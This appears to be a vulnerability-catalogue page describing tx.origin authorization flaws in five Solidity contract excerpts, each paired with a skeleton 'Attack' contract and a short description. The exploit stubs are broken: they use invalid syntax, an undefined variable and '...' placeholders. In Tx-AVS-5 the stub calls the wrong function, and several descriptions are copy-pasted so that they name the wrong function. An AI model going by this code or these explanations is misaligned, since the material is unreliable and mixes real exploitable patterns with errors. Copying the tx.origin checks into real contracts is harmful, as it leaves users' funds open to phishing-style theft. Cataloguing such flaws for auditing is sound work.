Abuse of Tx-origin Exploitation Code
------------------------------------

Tx-AVS-1
^^^^^^^^

Vulnerable Code 1
"""""""""""""""""

::

    function transferOrigin(address _to, uint256 _value) public returns (bool) {
        require(!locked);
        require(_to != address(0));
        require(msg.sender == impl);
        require(_value <= balances[tx.origin]);  //Vulnerable position

        // SafeMath.sub will throw if there is not enough balance.
        balances[tx.origin] = balances[tx.origin].sub(_value);
        balances[_to] = balances[_to].add(_value);
        emit Transfer(tx.origin, _to, _value);
        return true;
    }


Vulnerable Code 1
"""""""""""""""""

::

    function transferOrigin(address _to, uint256 _value) public returns (bool) {
        require(_to != address(0)); //code different
        require(_value <= balances[tx.origin]);

        balances[tx.origin] = balances[tx.origin].sub(_value);
        balances[_to] = balances[_to].add(_value);

        emit Transfer(tx.origin, _to, _value);

        return true;
    }


Exploit Code
""""""""""""

::

    Contract Attack{
        address victim;
        function setVictimAddress(address _address){
            victim = _address;
        }
        function startAttack(){
            victimAddress.call(byte4(keccak256(“transferOrigin(address, uint256)”)), ..., ... );
            ...
        }
    }


Description
"""""""""""

Note the location of comment of vulnerability position.If an malicious contract such as "Attack" to call the Victim Contract function such as "transferOrigin", Due to the 'tx.origin' ,so "Attack" can bypass the body condition. ps:"...." represent an appropriate parameter


Tx-AVS-2
^^^^^^^^

Vulnerable Code 1
"""""""""""""""""

::

    function depositTokenFunction(address _token, uint256 _amount, address _beneficiary) private {
            tokens[_token][_beneficiary] = tokens[_token][_beneficiary].add(_amount);
            
            if(tx.origin == _beneficiary) lastActiveTransaction[tx.origin] = now;   //Vulnerable position
            
            emit Deposit(_token, _beneficiary, _amount, tokens[_token][_beneficiary]);
    }




Exploit Code
""""""""""""

::

    Contract Attack{
        address victim;
        function setVictimAddress(address _address){
            victim = _address;
        }
        function startAttack(){
            victimAddress.call(byte4(keccak256(“depositTokenFunction(address, uint256, address)”)), ..., ..., ...);
            ...
        }
    }


Description
"""""""""""

Note the location of comment of vulnerability position.If an malicious contract such as "Attack" to call the Victim Contract function such as "transferOrigin", Due to the 'tx.origin' ,so "Attack" can bypass the body condition. ps:"...." represent an appropriate parameter


Tx-AVS-3
^^^^^^^^

Vulnerable Code 1
"""""""""""""""""

::

    function revokeHashPreSigned(
        bytes _signature,
        bytes32 _hashToRevoke,
        uint256 _gasPrice)
        public
        returns (bool)
    {
        uint256 gas = gasleft();
        address from = recoverRevokeHash(_signature, _hashToRevoke, _gasPrice);
        require(from != address(0), "Invalid signature provided.");
        
        bytes32 txHash = getRevokeHash(_hashToRevoke, _gasPrice);
        require(!invalidHashes[from][txHash], "Transaction has already been executed.");
        invalidHashes[from][txHash] = true;
        nonces[from]++;
        
        invalidHashes[from][_hashToRevoke] = true;
        
        if (_gasPrice > 0) {
            gas = 35000 + gas.sub(gasleft());
            require(_transfer(from, tx.origin, _gasPrice.mul(gas)), "Gas cost could not be paid.");  //Vulnerable position
        }
        
        emit HashRedeemed(txHash, from);
        return true;
    }
    
    
Vulnerable Code 1
"""""""""""""""""
::

    function approveAndCallPreSigned(
        bytes _signature,
        address _to, 
        uint256 _value,
        bytes _extraData,
        uint256 _gasPrice,
        uint256 _nonce) 
    public
    returns (bool) 
    {
        uint256 gas = gasleft();
        address from = recoverPreSigned(_signature, approveAndCallSig, _to, _value, _extraData, _gasPrice, _nonce);
        require(from != address(0), "Invalid signature provided.");

        bytes32 txHash = getPreSignedHash(approveAndCallSig, _to, _value, _extraData, _gasPrice, _nonce);
        require(!invalidHashes[from][txHash], "Transaction has already been executed.");
        invalidHashes[from][txHash] = true;
        nonces[from]++;

        if (_value > 0) require(_approve(from, _to, _value));
        ApproveAndCallFallBack(_to).receiveApproval(from, _value, address(this), _extraData);

        if (_gasPrice > 0) {
            gas = 35000 + gas.sub(gasleft());
            require(_transfer(from, tx.origin, _gasPrice.mul(gas)), "Gas cost could not be paid.");
        }

        emit HashRedeemed(txHash, from);
        return true;
    }//out3401



Exploit Code
""""""""""""

::

    Contract Attack{
        address victim;
        function setVictimAddress(address _address){
            victim = _address;
        }
        function startAttack(){
            victimAddress.call(byte4(keccak256(“revokeHashPreSigned(bytes, bytes32, uint256)”)), ..., ..., ...);
            ...
        }
    }


Description
"""""""""""

Note the location of comment of vulnerability position. Due to the 'tx.origin' ,whoever call this victim's method such as "revokeHashPreSigned", 'tx.origin' do not change.so the location of comment of vulnerability position is possible always success.ps:"...." represent an appropriate parameter


Tx-AVS-4
^^^^^^^^

Vulnerable Code 1
"""""""""""""""""

::

    function stake(
            bytes32 _uuid,
            uint256 _amountST,
            address _beneficiary)
            external
            returns (
            uint256 amountUT,
            uint256 nonce,
            uint256 unlockHeight,
            bytes32 stakingIntentHash)
            /* solhint-disable-next-line function-max-lines */
        {
            require(!deactivated);
            /* solhint-disable avoid-tx-origin */
            // check the staking contract has been approved to spend the amount to stake
            // OpenSTValue needs to be able to transfer the stake into its balance for
            // keeping until the two-phase process is completed on both chains.
            require(_amountST > 0);
            // Consider the security risk of using tx.origin; at the same time an allowance
            // needs to be set before calling stake over a potentially malicious contract at stakingAccount.
            // The second protection is that the staker needs to check the intent hash before
            // signing off on completing the two-phased process.
            require(valueToken.allowance(tx.origin, address(this)) >= _amountST); //Vulnerable position

            require(utilityTokens[_uuid].simpleStake != address(0));
            require(_beneficiary != address(0));

            UtilityToken storage utilityToken = utilityTokens[_uuid];

            // if the staking account is set to a non-zero address,
            // then all transactions have come (from/over) the staking account,
            // whether this is an EOA or a contract; tx.origin is putting forward the funds
            if (utilityToken.stakingAccount != address(0)) require(msg.sender == utilityToken.stakingAccount);
            require(valueToken.transferFrom(tx.origin, address(this), _amountST));

            amountUT = (_amountST.mul(utilityToken.conversionRate))
                .div(10**uint256(utilityToken.conversionRateDecimals));
            unlockHeight = block.number + blocksToWaitLong();

            nonces[tx.origin]++;
            nonce = nonces[tx.origin];

            stakingIntentHash = hashStakingIntent(
                _uuid,
                tx.origin,
                nonce,
                _beneficiary,
                _amountST,
                amountUT,
                unlockHeight
            );

            stakes[stakingIntentHash] = Stake({
                uuid:         _uuid,
                staker:       tx.origin,
                beneficiary:  _beneficiary,
                nonce:        nonce,
                amountST:     _amountST,
                amountUT:     amountUT,
                unlockHeight: unlockHeight
            });

            StakingIntentDeclared(_uuid, tx.origin, nonce, _beneficiary,
                _amountST, amountUT, unlockHeight, stakingIntentHash, utilityToken.chainIdUtility);

            return (amountUT, nonce, unlockHeight, stakingIntentHash);
            /* solhint-enable avoid-tx-origin */
        }


Exploit Code
""""""""""""

::

    Contract Attack{
        address victim;
        function setVictimAddress(address _address){
            victim = _address;
        }
        function startAttack(){
            victimAddress.call(byte4(keccak256(“stake(bytes32, uint256, address)”)), ..., ..., ...);
            ...
        }
    }


Description
"""""""""""

Note the location of comment of vulnerability position. Due to the 'tx.origin' ,whoever call this victim's method such as "stake", 'tx.origin' do not change.so the location of comment of vulnerability position is possible always success.ps:"...." represent an appropriate parameter


Tx-AVS-5
^^^^^^^^

Vulnerable Code 1
"""""""""""""""""

::

    function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) public {
        
            IERC20Token t = IERC20Token(_token);
            require(_token == address(token),"token is error" );
            require(_from == tx.origin,  "token from must equal tx.origin"); //Vulnerable position  
            require(isNotContract(_from),"token from  is not Contract");
            require(_value ==  mConfig.getPrice(),"value is error" );
            require(t.transferFrom(_from, this, _value),"transferFrom has error");

            bytes memory inviteBytes = slice(_extraData,0,_extraData.length-1);
            bytes memory numBytes = slice(_extraData,_extraData.length-1,1);
            uint8  num = uint8(bytesToUint(numBytes));
            bytes32 inviteName = stringToBytes32(inviteBytes);
            PK(_from,num,inviteName);
    }
    

Vulnerable Code 2
"""""""""""""""""

::

    function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) public {
       
        IERC20Token t = IERC20Token(_token);
        require(_token == address(token) );
        require(_from == tx.origin,  "token from must equal tx.origin");
        require(isNotContract(_from),"token from  is not Contract");
        require(_value == curConfig.singlePrice );
        require(t.transferFrom(_from, this, _value));
        addPlayer(_from);
        
        bytes32 inviteName = stringToBytes32(_extraData);
        inviteHandler(inviteName);
    }




Exploit Code
""""""""""""

::

    Contract Attack{
        address victim;
        function setVictimAddress(address _address){
            victim = _address;
        }
        function startAttack(){
            victimAddress.call(byte4(keccak256(“transferOrigin(address, uint256, address, bytes)”)), ..., ..., ..., ... );
            ...
        }
    }


Description
"""""""""""

Note the location of comment of vulnerability position.If an malicious contract such as "Attack" to call the Victim Contract function such as "transferOrigin", Due to the 'tx.origin' ,so "Attack" can bypass the body condition. ps:"...." represent an appropriate parameter

